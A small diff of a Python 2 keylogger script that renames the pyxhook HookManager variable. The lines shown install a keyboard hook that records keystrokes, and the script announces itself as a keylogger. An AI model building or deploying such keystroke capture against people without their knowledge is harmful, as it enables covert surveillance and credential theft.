@@ -18,10 +18,10 @@ def keypress(event):
 raw_input("\n\tPress ENTER to start keyloggging :")
 print "\tTo stop press GRAVE key (`)"
 
-new_hook=pyxhook.HookManager()
-new_hook.KeyDown=keypress
-new_hook.HookKeyboard()
-new_hook.start()
+nhook=pyxhook.HookManager()
+nhook.KeyDown=keypress
+nhook.HookKeyboard()
+nhook.start()
 
 def view():
 	print "\tYou are now viewing : \n\n----------"
